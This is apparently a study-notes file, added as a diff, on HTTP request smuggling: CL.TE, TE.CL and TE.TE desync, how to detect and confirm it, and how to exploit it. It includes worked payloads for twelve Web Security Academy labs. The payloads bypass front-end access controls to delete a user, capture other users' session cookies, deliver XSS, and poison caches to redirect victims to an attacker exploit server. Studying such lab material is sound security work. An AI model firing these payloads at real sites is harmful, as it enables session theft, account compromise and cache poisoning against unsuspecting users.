@@ -1,0 +1,540 @@
+HTTP Request Smuggling:
+- Technique for interfering with the way a website process sequences of requests that received from one or more users
+- Impact: allow attacker to bypass security control, gain unauthorized access to sensitive data and directly compromise other application users
+- Primarily associated with HTTP/1, but HTTP/2 sites may also be vulnerable depending on BE architecture
+
+Context:
+- Simple architecture that frequently used in modern applications
+    Client -> FE server (load balance or reverse proxy) -> BE server
+- When FE forward request to BE, it typically send several request over same connection -> much more efficient and performant
+    + HTTP requests are sent one after another and receiving server has to determine where request end and next begin
+    + If FE and BE have different rule of boundary between requests -> attacker could send ambiguous request and get interpreted differently by FE and BE systems
+
+How this vuln arise:
+- Because the HTTP/1 specification provides two different ways to specify where a request ends:
+    + Content-Length header: specify length of message body in bytes
+    + Transfer-Encoding header: specify that the message body uses chunked encoding. Message body could contain one or more chunks of data, each chunk consist of chunk size in bytes (expressed in hexadecimal), followed by newline and chunk contents. It terminated with chunk of size 0
+    + Note:
+        + Many security testers are unaware that chunked encoding can be used in HTTP requests, for 2 reasons:
+            + Burp Suite automatically unpacks chunked encoding to make messages easier to view and edit
+            + Browsers do not normally use chunked encoding in requests, and it is normally seen only in server responses
+- Possible for single request use both CL and TE at once
+    -> So the specification attempts to prevent this problem by ignore one
+- Problem: if two or more servers are chained together can cause different behavior in determine boundary between requests
+- Note:
+    + Web that use HTTP/2 end-to-end are immune to this attack. As it introduce a single, robust mechanism for specifying length of request
+    + But many web have HTTP/2 in FE server, but BE only support HTTP/1
+        -> FE must translate request by downgrading into HTTP/1 -> vuln
+
+How to perform attack:
+- Classic method is placing both CL, TE headers into single HTTP.1 request and modify body to cause different behavior between FE and BE
+- 3 ways that can happen:
+    + CL.TE: FE uses CL, BE uses TE
+    + TE.CL: FE uses TE, BE uses CL
+    + TE.TE: both support TE, but one can be induced not to process it by obfuscating the header in some way
+- Note:
+    + These techniques only work with HTTP/1 request
+    + Burp and browsers default to HTTP/2 when server advertises support via TLS handshake
+    + When testing HTTP/2 sites, need manually switch protocol in Burp Repeater > Request attributes > Inspector panel
+
+- CL.TE vulnerabilities: (1)
+- TE.CL vulnerabilities: (2)
+- TE.TE behavior: obfuscating the TE header (3)
+
+Identifying vuln using timing techniques:
+- Finding CL.TE:
+        POST / HTTP/1.1
+        Host: vulnerable-website.com
+        Transfer-Encoding: chunked
+        Content-Length: 4
+
+        1
+        A
+        X
+    + FE forward '1\r\nA' only
+    + BE parse chunk of size 1 'A', then wait for next chunk size or \r\n to end the chunk data, but next chunk never arrive -> timeout
+- Finding TE.CL:
+        POST / HTTP/1.1
+        Host: vulnerable-website.com
+        Transfer-Encoding: chunked
+        Content-Length: 6
+
+        0
+
+        X
+    + FE forward '0\r\n\r\n'
+    + BE expect 6 bytes, but only get 5 bytes -> wait for 1 more bytes that never arrive -> timeout
+- Note: to minimize disruption to other users, should test for CL.TE first, then try to test for TE.CL
+
+
+Confirming vuln using differential responses:
+- Involve sending 2 requests: an attack request and normal request. If response of normal request is unexpected -> confirm vuln
+    + Normal request:
+        POST /search HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 11
+
+        q=smuggling
+- Confirming CL.TE: (4)
+    + Attack request:
+        POST /search HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 49
+        Transfer-Encoding: chunked
+
+        e
+        q=smuggling&x=
+        0
+
+        GET /404 HTTP/1.1
+        Foo: x
+    + This request will poison other request and cause response status code 404
+- Confirming TE.CL: (5)
+    + Attack request:
+        POST /search HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 4
+        Transfer-Encoding: chunked
+
+        7c
+        GET /404 HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 144
+
+        x=
+        0
+    + This request will poison other request and cause response status code 404
+- Note:
+    + 2 requests must use different network connections (same connection won't prove anything)
+    + Use same URL and parameters for both requests (FE may route to different BEs based on URL/params)
+    + Race condition with other requests -> send normal request immediately after attack, may need multiple attempts
+    + Load balancer may forward to different BEs -> additional reason for retry
+    + If attack affects another user's request instead of your normal request -> other user was impacted, exercise caution
+
+Exploit:
+- Bypass FE security control: (6, 7)
+    + Some application use FE server to implement some security control, decide whether to allow request to be processed and pass to BE
+    + For example, FE implement access control restriction, only forward request if user is authorized to access requested URL. BE then honors every request without further checking
+            POST /home HTTP/1.1
+            Host: vulnerable-website.com
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 62
+            Transfer-Encoding: chunked
+
+            0
+
+            GET /admin HTTP/1.1
+            Host: vulnerable-website.com
+            Foo: xGET /home HTTP/1.1
+            Host: vulnerable-website.com
+        + FE sees 1 request, BE sees 2 request
+- Revealing front-end request rewriting: (8)
+    + Some application rewrite and adding header before they forwarded to BE. Example:
+        + Terminate TLS connection and add some headers describing the protocol and ciphers that were used
+        + Add X-Forwarded-For header contain user's IP address
+        + Determine user's ID based on their session token and add header identifying the user
+        + Add some sensitive information that is of interest for other attacks
+    + If smuggled requests are missing headers that normally added by FE server, BE might not process it in normal way -> fail
+    + To reveal exactly how FE rewrite request, need to perform some steps:
+        + Find POST request that reflect value of request param into response
+        + Shuffle params so that reflected param appears last in the message body
+        + Smuggle request to BE server, follwed by a normal request rewritten form you want to reveal
+    + Example:
+        <input id="email" value="wiener@normal-user.net" type="text">
+        ----------------------------------
+        POST / HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Length: 130
+        Transfer-Encoding: chunked
+
+        0
+
+        POST /login HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 100
+
+        email=POST /login HTTP/1.1
+        Host: vulnerable-website.com
+        ...
+        ------------------------------------
+        <input id="email" value="POST /login HTTP/1.1
+        Host: vulnerable-website.com
+        X-Forwarded-For: 1.3.3.7
+        X-Forwarded-Proto: https
+        X-TLS-Bits: 128
+        X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
+        X-TLS-Version: TLSv1.2
+        x-nr-external-service: external
+        ...
+    + Note:
+        + You don't know how long rewritten request will be but must be determine yourself
+        + If set CL too short, only receive part of request, if too long BE will timeout waiting for request complete
+- Bypassing client authentication:
+    + TLS handshake: (one-way)
+        + Client ---> Server (client verify server cert)
+        + Server authenticate themselves with client by provide a certtificate contain their "common name" (CN), which match their registered hostname
+        + Client can use this to verify that they're talking to a legitimate server
+    + Mutual TLS authentication (mTLS): (two-way)
+        + Client <---> Server (both need to verify cert)
+        + Client must also present a cert to server
+        + Client's CN is often a username, which would be used as part of access control mechanism in BE
+        + Component that authenticate client typically pass data to BE via one or more non-standard HTTP headers. Example:
+            GET /admin HTTP/1.1
+            Host: normal-website.com
+            X-SSL-CLIENT-CN: carlos
+            + These header is hidden from users and implicitly trusted by BE server
+            + If can send fake headers and values -> able to bypass access control 
+            + In practice, FE will override these headers if they're already present, so it usually unexploitable
+    + Smuggled requests are hidden from FE -> any headers contain will be sent to BE unchanged
+        POST /example HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Type: x-www-form-urlencoded
+        Content-Length: 64
+        Transfer-Encoding: chunked
+
+        0
+
+        GET /admin HTTP/1.1
+        X-SSL-CLIENT-CN: administrator
+        Foo: x
+- Capturing other users' requests: (9)
+    + If application contain any function that allow you store and later retrieve -> can capture other users's request
+        + May include session tokens or sensitive data,....
+        + Suitable function to store would be comments, emails, profile descriptions, screen names,...
+    + To perform attack, need smuggle a request that submit data to storage function with param contain data positioned last in request. Example: (CL.TE)
+        GET / HTTP/1.1
+        Host: vulnerable-website.com
+        Transfer-Encoding: chunked
+        Content-Length: 330
+
+        0
+
+        POST /post/comment HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 400
+        Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+        csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
+        
+        + This case, BE will wait for remaining bytes or will timeout if it doesn't arrive quick enough
+    + Limit of this technique is that it will only capture data until meet delimeter (&)
+- Using HTTP request smuggling to exploit reflected XSS: (10)
+    + If app vuln to both HTTP request smuggling and contain reflected XSS -> can use smuggled request to hit other users
+    + 2 advantages of this technique:
+        + No user interaction need
+        + Can exploit XSS in part of request that can't be trivially controlled (like headers)
+    + Example:
+        POST / HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Length: 63
+        Transfer-Encoding: chunked
+
+        0
+
+        GET / HTTP/1.1
+        User-Agent: <script>alert(1)</script>
+        Foo: X
+- Using HTTP request smuggling to turn an on-site redirect into an open redirect: 
+    + Redirect victim's request to attacker server
+    + Default behavior of Apache and IIS web servers, request to a folder without trailing receives a redirect to the same folder including trailing slash
+        GET /home HTTP/1.1
+        Host: normal-website.com
+
+        HTTP/1.1 301 Moved Permanently
+        Location: https://normal-website.com/home/
+    + This behavior is harmless, but it can be exploited to redirect other users to external domain. For example:
+        POST / HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Length: 54
+        Transfer-Encoding: chunked
+
+        0
+
+        GET /home HTTP/1.1
+        Host: attacker-website.com
+        Foo: XGET /scripts/include.js HTTP/1.1
+        Host: vulnerable-website.com
+        ----------------------------------------
+        HTTP/1.1 301 Moved Permanently
+        Location: https://attacker-website.com/home/
+
+    + Turning root-relative redirects into open redirects:
+        + Some servers use path to construct root-relative URl for Location header (no domain in Location)
+            GET /example HTTP/1.1
+            Host: normal-website.com
+
+            HTTP/1.1 301 Moved Permanently
+            Location: /example/
+        + If server allows protocol-relative URL in path -> open redirect
+            GET //attacker-website.com/example HTTP/1.1
+            Host: vulnerable-website.com
+
+            HTTP/1.1 301 Moved Permanently
+            Location: //attacker-website.com/example/
+        + Browser interprets //attacker-website.com/ as protocol-relative URL -> navigates to attacker's site
+- Using HTTP request smuggling to perform web cache poisoning: (11)
+    + If FE caches content -> smuggled redirect response gets cached under victim's requested URL
+    + It make attack persistent, affecting all subsequent users request to that URL
+    + Victim sent request to static resource, after that it would append to smuggled request but still think that is static resource and get cached
+        POST / HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Length: 59
+        Transfer-Encoding: chunked
+
+        0
+
+        GET /home HTTP/1.1
+        Host: attacker-website.com
+        Foo: XGET /static/include.js HTTP/1.1
+        Host: vulnerable-website.com
+        + This cached open redirect request to attacker's server
+- Using HTTP request smuggling to perform web cache deception: (12)
+    + Difference between web cache poisoning and web cache deception:
+        + Web cache poisoning: store malicious content in cache -> serve to other users
+        + Web cache deception: store sensitive content belong to another user -> attacker retrieve it through cached page
+    + For example: private message will be cached in /static/some-image.png
+        POST / HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Length: 43
+        Transfer-Encoding: chunked
+
+        0
+
+        GET /private/messages HTTP/1.1
+        Foo: XGET /static/some-image.png HTTP/1.1
+        Host: vulnerable-website.com
+        Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
+    + Disadvantage: attacker doesn't know which URL has cached sensitive info, so need to fetch a large static URL to check
+
+
+Advanced request smuggling:
+- HTTP/2 message length:
+    + Request smuggling is fundamentally about exploit discrepancies
+
+
+
+
+
+01_HTTP_request_smuggling_basic_CL.TE_vulnerability
+- Just add prefix G to poison next request
+- Payload:
+    POST / HTTP/1.1
+    Host: 0afb008804e2f8a081a1307700090083.web-security-academy.net
+    Content-Length: 6
+    Transfer-Encoding: chunked
+
+    0
+
+    G
+
+02_HTTP_request_smuggling_basic_TE_CL_vulnerability
+- Note:
+    + Remember that chunked size is present in hexadecimal
+    + Request terminate with 0\r\n\r\n
+- Payload:
+    POST / HTTP/1.1
+    Host: 0aee00530349b65381114d31008300df.web-security-academy.net
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    6b
+    GPOST / HTTP/1.1
+    Host: 0aee00530349b65381114d31008300df.web-security-academy.net
+    Content-Length: 10
+
+    x=
+    0
+
+
+03_HTTP_request_smuggling_obfuscating_the_TE_header
+- Just obfuscate by duplicate TE header
+- Payload:
+    POST / HTTP/1.1
+    Host: 0a17004903bc6e6e8106c2ed00900072.web-security-academy.net
+    Content-Length: 4
+    Transfer-Encoding: chunked
+    Transfer-Encoding: x
+
+    6b
+    GPOST / HTTP/1.1
+    Host: 0a17004903bc6e6e8106c2ed00900072.web-security-academy.net
+    Content-Length: 10
+
+    x=
+    0
+
+
+04_HTTP_request_smuggling_confirming_a_CL_TE_vulnerability_via_differential_responses
+- Payload:
+    POST / HTTP/1.1
+    Host: 0a2700e704d08ac9809c30620037003a.web-security-academy.net
+    Content-Length: 30
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /404 HTTP/1.1
+    Foo: x
+
+05_HTTP_request_smuggling_confirming_a_TE_CL_vulnerability_via_differential_responses
+- Payload:
+    POST / HTTP/1.1
+    Host: 0abe0020041535cb80c29e7c00d60071.web-security-academy.net
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    5b
+    GET /t HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 100
+
+    x=
+    0
+
+
+06_Exploiting_HTTP_request_smuggling_to_bypass_front_end_security_controls_CL_TE_vulnerability
+- FE sees 1 request, BE sees 2 request
+    + FE doesn't see /admin in request line -> bypass
+- Host header must set to localhost to access internal system
+- Payload:
+    POST / HTTP/1.1
+    Host: 0a57007a03b99c2a81cd8f18006300cb.web-security-academy.net
+    Content-Length: 140
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /admin/delete?username=carlos HTTP/1.1
+    Host: localhost
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 10
+
+    x=t
+
+07_Exploiting_HTTP_request_smuggling_to_bypass_front_end_security_controls_TE_CL_vulnerability
+- Same as lab 06 but for TE.CL
+- Payload:
+    POST / HTTP/1.1
+    Host: 0a8a000f035c28f9805ecb87006800f1.web-security-academy.net
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    86
+    GET /admin/delete?username=carlos HTTP/1.1
+    Host: localhost
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 10
+
+    x=
+    0
+
+
+08_Exploiting_HTTP_request_smuggling_to_reveal_front_end_request_rewriting
+- Payload: identify hidden headers + delete user account
+    POST / HTTP/1.1
+    Host: 0a29008a0325176a812f5cc400c800e3.web-security-academy.net
+    Content-Length: 168
+    Transfer-Encoding: chunked
+
+    0
+
+    POST / HTTP/1.1
+    Host: 0a29008a0325176a812f5cc400c800e3.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 200
+
+    search=@@
+    ----------
+    POST / HTTP/1.1
+    Host: 0a29008a0325176a812f5cc400c800e3.web-security-academy.net
+    Content-Length: 189
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /admin/delete?username=carlos HTTP/1.1
+    X-allYig-Ip: 127.0.0.1
+    Host: 0a29008a0325176a812f5cc400c800e3.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+
+
+09_Exploiting_HTTP_request_smuggling_to_capture_other_users_requests
+- This lab is CL.TE type
+- Payload: capture request
+    POST / HTTP/1.1
+    Host: 0ab100d8040151a4800b17d3000b0002.web-security-academy.net
+    Content-Length: 340
+    Transfer-Encoding: chunked
+
+    0
+
+    POST /post/comment HTTP/1.1
+    Host: 0ab100d8040151a4800b17d3000b0002.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 950
+    Cookie: session=7MAyEpi2PbZFU4cFPHdkpIMMqQTg2F69
+
+    csrf=jWYq7Frml7y8TQPZrBgO2f8AUv5mPIxt&postId=1&name=test&email=test%40gmail.com&website=https%3A%2F%2Ftest.com&comment=
+
+10_Exploiting_HTTP_request_smuggling_to_deliver_reflected_XSS
+- This lab is CL.TE
+- It also reflect userAgent in response of blog post
+- Payload:
+    POST / HTTP/1.1
+    Host: 0a71004d03a4c49880a3033700b70054.web-security-academy.net
+    Content-Length: 84
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /post?postId=1 HTTP/1.1
+    User-Agent: " ><script>alert(1)</script><"
+    Foo: X
+
+11_Exploiting_HTTP_request_smuggling_to_perform_web_cache_poisoning
+- This lab is CL.TE and configured to cache response
+- Notice that:
+    + If visit /post/next?postId=1, it will cause a 302 redirect using Host header in Location
+    + Static resource like /resources/js/tracking.js will be cached by FE
+- Exploit:
+    + First send payload to smuggle next request
+    + Second request is try to request for static resource, it would cause both redirect to attacker's server and cached that responses
+    + Last is just go to any page that import tracking.js file, it will cause redirect to malicious js file
+- Note: both first and second request must be sent on same connection
+- Payload:
+    POST / HTTP/1.1
+    Host: 0a4e006304b6314a80156c2d00720018.web-security-academy.net
+    Content-Length: 179
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /post/next?postId=1 HTTP/1.1
+    Host: exploit-0a84006c04c931ad80106b04015400f6.exploit-server.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 10
+
+    x=
+
+12_Exploiting_HTTP_request_smuggling_to_perform_web_cache_deception
+- This lab is CL.TE and configured to cache response
+- Just smuggled /my-account page to hijack API key
+    + Then wait for user visit and cached their page
+    + Then just go to /resources/js/tracking.js to get cached resource
+    + Idk exactly which resource is used for cache, just choose that js file with high chance
+- Payload:
+    POST / HTTP/1.1
+    Host: 0aae00730318c20b80f303e200b00082.web-security-academy.net
+    Content-Length: 37
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /my-account HTTP/1.1
+    Foo: X
